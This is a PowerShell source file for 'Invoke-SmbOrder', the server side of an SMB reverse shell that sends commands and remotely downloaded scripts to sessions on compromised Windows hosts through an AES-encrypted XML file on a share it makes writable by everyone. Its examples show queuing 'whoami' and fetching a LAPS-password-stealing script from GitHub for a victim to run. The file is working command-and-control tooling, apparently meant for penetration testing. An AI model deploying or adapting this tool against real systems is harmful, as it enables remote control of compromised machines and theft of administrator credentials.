<#
.SYNOPSIS

SMB reverse shell - Server component

.DESCRIPTION

Execute Powershell commands on a remote host by using an encrypted XML file and accessible SMB share.

.PARAMETER SmbFile

The path to XML file containing the commands and results.

.PARAMETER Action

Type of action that will be performed. Possible values: create, query, command, script, clear

.PARAMETER Session

MD5 hash value of a session.

.PARAMETER Execute

Powershell command that will be executed.

.PARAMETER Url

URL that holds a Powershell script.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action create

Create encrypted XML file.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action query

Query XML file for sessions.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action query -Session 5E43AD84D02509F5A6E4A92CDFDC8730

Query XML file for specific session.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action command -Execute "whoami" -Session 5E43AD84D02509F5A6E4A92CDFDC8730

Execute a command for specific session.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action script -Url "https://raw.githubusercontent.com/r1cksec/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1" -Session 5E43AD84D02509F5A6E4A92CDFDC8730

Execute a command for specific session.

.EXAMPLE

Invoke-SmbOrder \\192.168.1.1\share\file.xml -Action clear

Remove all pending commands and scripts.

.NOTES

Author: r1cksec
License: GNU General Public License

#>
Function Invoke-SmbOrder
{
    Param
    (
        [Parameter(Mandatory = $true)][string]$XmlFile = "",
        [Parameter(Mandatory = $true)][string]$Action = "",
        [Parameter(Mandatory = $false)][string]$Session = "",
        [Parameter(Mandatory = $false)][string]$Execute = "",
        [Parameter(Mandatory = $false)][string]$Url = ""
    )

    # reject wrong actions
    if (-not (($Action -eq "create") -or ($Action -eq "query") -or ($Action -eq "command") -or ($Action -eq "script") -or ($Action -eq "clear")))
    {
        Write-Host "`n'-Action $Action' unknown!"
        Write-Host "Use one of the following actions: create, query, command, script, clear`n"
        return
    }

    # check mandatory argument dependencies
    if ($Action -eq "command")
    {
        if ($Session -eq "")
        {
            Write-Host "`n'-Session <id>' is mandatory for '-Action command'!`n"
            return
        }
    }

    if ($Action -eq "script")
    {
        if (($Session -eq "") -or ($Url -eq ""))
        {
            Write-Host "`n'-Session <id>' and '-Url <script>' are mandatory for '-Action script!`n"
            return
        }
    }

    if (($Action -eq "command") -and ($Url -ne ""))
    {
        Write-Host "`n'-Action command' can not be used with argument '-Url <script>'!`n"
        return
    }

    # check if session is valid md5 hash
    if ($Session -ne "")
    {
        $BufSession = $Session.ToLower()

        foreach ($Char in $BufSession.TocharArray())
        {
            if ($Char -match "a|b|c|d|e|f|0|1|2|3|4|5|6|7|8|9")
            {
                continue
            }
            else
            {
                Write-Host "`n'-Session $Session' is not a valid MD5 hash!`n"
                return
            }
        }

        if ($Session.length -ne 32)
        {
            Write-Host "`n'-Session $Session' is not a valid MD5 hash!`n"
            return
        }
    }

    [byte[]] $AesSalt = @(9,35,13,64,33,123,192,9,74,12,254,53,152)
    $AesPassword = "CommandLineHeroes>_"
    $AesPassword = [system.text.encoding]::ASCII.GetBytes($AesPassword)

    if ($Action -eq "create")
    {
        if (Test-Path -path $XmlFile)
        {
            Write-Host "`nCommand file already exists! Check available sessions using: '-Action query'`n"
            return
        }
        else
        {
            Write-Host "`nCreate new command file - ready to receive sessions!`n"
            $InitilContent = "<sessions></sessions>"

            # encrypt content and write to file
            [byte[]]$EncryptedContent = $Null
            $InitialBytes = [system.text.encoding]::ASCII.GetBytes($InitilContent)
            $EncryptedContent = AesEncrypt($InitialBytes)
            $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
            $EncryptedBase64 | Export-Clixml $XmlFile

            # make file accessible for everyone
            $ModifyAcl = Get-Acl -Path $XmlFile
            $BuiltinUsersSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0' 
            $UsersSidValue = $BuiltinUsersSid.Translate([System.Security.Principal.NTAccount]).value
            $SystemAccessArguments = $UsersSidValue, "Modify", "Allow"
            $AccessObject = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $UsersSidValue, "Modify", "Allow"
            $ModifyAcl.SetAccessRule($AccessObject)
            Set-Acl -Path $XmlFile -AclObject $ModifyAcl -ErrorAction SilentlyContinue
            return
        }
    }
    else
    {
        if (-not (Test-Path -path $XmlFile))
        {
            Write-Host "`nCommand file does not exist!"
            Write-Host "Use '-Action create' to start session collection!`n"
            return
        }
    }

    if ($Action -eq "query")
    {
        # decrypt file
        $XmlContent = New-Object XML 
        [byte[]]$DecryptedContent = $Null
        $RawContent = Import-Clixml $XmlFile
        $EncryptedContent = [Convert]::FromBase64String($RawContent)
        $CleartextXml = AesDecrypt($EncryptedContent)
        $XmlContent.loadxml($CleartextXml)
        $SessionAmount = $XmlContent.SelectNodes('//session').count
        if ($SessionAmount -eq 0)
        {
            Write-Host "`nNo session has been registered so far."
            Write-Host "Make sure that Invoke-SmbObey was executed correctly and that the XML file is accessible by the compromised client!`n"
        }

        if ($Session -eq "")
        {
            $AllSessions = $XmlContent.SelectNodes('//session')
            
            foreach ($CurrSess in $AllSessions)
            {
                $Counter = 0

                foreach ($I in $CurrSess.command)
                {
                    $Counter = $Counter + 1
                }

                $Properties = @{
                    Lastseen = $CurrSess.lastseen
                    Commands = $Counter
                    User = FromBase64($CurrSess.user)
                    Hostname = FromBase64($CurrSess.hostname)
                    Id = $CurrSess.id
                }
                $printSessions = New-Object psobject -Property $Properties
                $printSessions | Format-Table -AutoSize -Property Id, Hostname, User, Lastseen, Commands
            }

        }
        else
        {
            $SessionId = $XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session}

            if ($SessionId -eq $Null)
            {
                Write-Host "`nThe session id $Session does not exist!`n"
                return
            }

            $CurrSession = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session}).command
            Write-Host "`n<=====================================================================>`n"

            # used to determine if at least one command will be printed
            $NoCommandFlag = "1"

            foreach ($Element in $CurrSession)
            {
                $NoCommandFlag = "0"
                $PrintDate = $Element.date
                Write-Host "Date: " -ForegroundColor Magenta -NoNewline
                Write-Host $PrintDate

                if (($Element.date -ne "pending") -and ($Element.result -ne "cHJvY2Vzc2VkCg=="))
                {
                    $PrintStatus = $Element.status
                    Write-Host "Status: " -ForegroundColor Magenta -NoNewline 

                    if ($PrintStatus -eq "Success!")
                    {
                        Write-Host $PrintStatus -ForegroundColor Green
                    }
                    else
                    {
                        Write-Host $PrintStatus -ForegroundColor Red
                    }
                }

                # print decoded base64 if element is a command
                if ($Element.name -eq "")
                {
                    $PrintCommand = FromBase64($Element.execute)
                    Write-Host "Command: " -ForegroundColor Magenta -NoNewline 
                    Write-Host $PrintCommand
                }
                # print only url if element is a script
                else
                {
                    $PrintUrl = $Element.name
                    Write-Host "Script: " -ForegroundColor Magenta -NoNewline 
                    Write-Host $PrintUrl
                }

                $PrintResult = FromBase64($Element.result)
                $PrintResult

                Write-Host "<=====================================================================>`n"

                # remove processed commands
                if (($Element.date -ne "pending") -and ($Element.result -ne "cHJvY2Vzc2VkCg=="))
                {
                     $Element.ParentNode.RemoveChild($Element) | Out-Null
                }

            }
        }

        # encrypt
        [byte[]]$EncryptedContent = $Null
        $XmlAsString = $XmlContent.OuterXml
        $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
        $EncryptedContent = AesEncrypt($XmlBytes)
        $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
        $EncryptedBase64 | Export-Clixml $XmlFile

        if ($NoCommandFlag -eq "1")
        {
            Write-Host "No command or script executed!"
            Write-Host "Use '-Action command -Execute <command> -Session <id>' to run commands on specific session."
            Write-Host "`n<=====================================================================>`n"
        }

        return
    }

    if ($Action -eq "script")
    {
        try
        {
            $WebCl = New-Object Net.Webclient
            $WebCl.proxy = [Net.WebRequest]::GetSystemWebProxy()
            $WebCl.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]'Tls12'
            $Base64Script = ToBase64($WebCl.downloadstring($Url))
        }
        catch 
        {
            Write-Host "`nLoading script from $Url failed!"
            Write-Host "$error[0] `n"
            return
        }
    }

    if (($Action -eq "script") -or ($Action -eq "command"))
    {
        # decrypt file
        $XmlContent = New-Object XML 
        [byte[]]$DecryptedContent = $Null
        $RawContent = Import-Clixml $XmlFile
        $EncryptedContent = [Convert]::FromBase64String($RawContent)
        $CleartextXml = AesDecrypt($EncryptedContent)
        $XmlContent.loadxml($CleartextXml)

        $Commands = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session})

        if ($Commands -eq $Null)
        {
            Write-Host "`nThe session id $Session does not exist!`n"
            return
        }

        $NewCommand = $XmlContent.CreateElement("command")
        $NewCommand.SetAttribute("date","pending")

        # insert base64 script into execute value if element is a script
        if ($Url -ne "")
        {
            $NewCommand.SetAttribute("execute", $Base64Script)
            $NewCommand.SetAttribute("name", $Url)
        }
        # insert base64 command into execute value if element is a command
        else
        {
            $base64Command = ToBase64($Execute)
            $NewCommand.SetAttribute("execute", $base64Command)
            $NewCommand.SetAttribute("name", "")
        }

        $NewCommand.SetAttribute("result", "")
        $NewCommand.SetAttribute("status", "")
        $Commands.AppendChild($NewCommand) | Out-Null

        # encrypt 
        [byte[]]$EncryptedContent = $Null
        $XmlAsString = $XmlContent.OuterXml
        $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
        $EncryptedContent = AesEncrypt($XmlBytes)
        $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
        $EncryptedBase64 | Export-Clixml $XmlFile
        Write-Host "`nThe command/script was successfully transmitted!`n"
        return
    }

    if ($Action -eq "clear")
    {
        # decrypt
        $XmlContent = New-Object XML 
        [byte[]]$DecryptedContent = $Null
        $RawContent = Import-Clixml $XmlFile
        $EncryptedContent = [Convert]::FromBase64String($RawContent)
        $CleartextXml = AesDecrypt($EncryptedContent)
        $XmlContent.loadxml($CleartextXml)

        if ($Session -eq "")
        {
            $Commands = $XmlContent.SelectNodes('//session//command')

            foreach ($Element in $Commands)
            {
                # remove processed commands
                if (($Element.date -eq "pending") -or ($Element.result -eq "cHJvY2Vzc2VkCg=="))
                {
                     $Element.ParentNode.RemoveChild($Element) | Out-Null
                }
            }
        }
        else
        {
            $Commands = ($XmlContent.SelectNodes('//session') | Where-Object {$_.id -eq $Session}).command

            foreach ($Element in $Commands)
            {
                # remove processed commands
                if (($Element.date -eq "pending") -or ($Element.result -eq "cHJvY2Vzc2VkCg=="))
                {
                     $Element.ParentNode.RemoveChild($Element) | Out-Null
                }
            }
        }

        # encrypt 
        [byte[]]$EncryptedContent = $Null
        $XmlAsString = $XmlContent.OuterXml
        $XmlBytes = [system.text.encoding]::ASCII.GetBytes($XmlAsString)
        $EncryptedContent = AesEncrypt($XmlBytes)
        $EncryptedBase64 = [Convert]::ToBase64String($EncryptedContent)
        $EncryptedBase64 | Export-Clixml $XmlFile
        return
    }
}

function FromBase64([String] $Str)
{
    $Enc = [system.Text.Encoding]::UTF8
    $Bytes = [System.Convert]::FromBase64String($Str)
    return $Enc.GetString($Bytes)
}

function ToBase64([String] $Str)
{
    $Enc = [system.Text.Encoding]::UTF8
    $Bytes = $Enc.GetBytes($Str)
    return [Convert]::ToBase64String($Bytes)
}

function AesEncrypt([byte[]]$BytesToEncrypt)
{
    [byte[]] $encryptedBytes = @()
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AesObject = New-Object System.Security.Cryptography.RijndaelManaged
    $AesObject.KeySize = 256;
    $AesObject.BlockSize = 128;
    [System.Security.Cryptography.Rfc2898DeriveBytes] $Key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($AesPassword, $AesSalt, 1000);
    $AesObject.Key = $Key.GetBytes($AesObject.KeySize / 8);
    $AesObject.IV = $Key.GetBytes($AesObject.BlockSize / 8);
    $AesObject.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $AesObject.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    try
    {
        $CryptoStream.Write($BytesToEncrypt, 0, $BytesToEncrypt.Length);
        $CryptoStream.Close();
    }
    catch [Exception]
    {
        Write-Host "Error occured while encrypting xml file!"
        break
    }

    $EncryptedContent = $MemoryStream.ToArray();
    return $EncryptedContent
}

function AesDecrypt([byte[]]$BytesToDecrypt)
{
    [byte[]]$DecryptedBytes = @();
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AesObject = New-Object System.Security.Cryptography.RijndaelManaged
    $AesObject.KeySize = 256;
    $AesObject.BlockSize = 128;
    [System.Security.Cryptography.Rfc2898DeriveBytes] $Key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($AesPassword, $AesSalt, 1000);
    $AesObject.Key = $Key.GetBytes($AesObject.KeySize / 8);
    $AesObject.IV = $Key.GetBytes($AesObject.BlockSize / 8);
    $AesObject.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $AesObject.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    try
    {
        $CryptoStream.Write($BytesToDecrypt, 0, $BytesToDecrypt.Length)
        $CryptoStream.Close()
    }
    catch [Exception]
    {
        Write-Host "Error occured while decrypting xml file!"
        break
    }

    $DecryptedBytes = $MemoryStream.ToArray();
    $ClearText = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    return $ClearText
}

